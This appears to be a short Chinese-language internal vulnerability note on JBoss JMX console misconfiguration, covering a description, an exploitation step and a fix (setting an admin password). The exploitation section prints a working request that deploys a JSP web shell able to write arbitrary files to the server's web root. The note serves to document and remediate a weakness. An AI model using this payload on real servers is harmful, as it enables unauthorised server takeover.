### 一 漏洞描述
JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。  
但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。  
JBoss 由于配置错误，导致后台密码被暴力破解或者没有后台密码导致攻击者可以上传恶意文件直接控制服务器。  

ps: jboss目前使用量较少，内部扫描一圈没有发现jboss

### 二 漏洞利用
```
/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=AAA.war&argType=java.lang.String&arg1=wh&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%><a href="One_OK"></a>&argType=boolean&arg4=True
```
访问 /AAA/wh.jsp

### 三 漏洞修复
添加/修改后台密码

> 参考链接  
> https://blog.csdn.net/xiaobing_122613/article/details/54612468
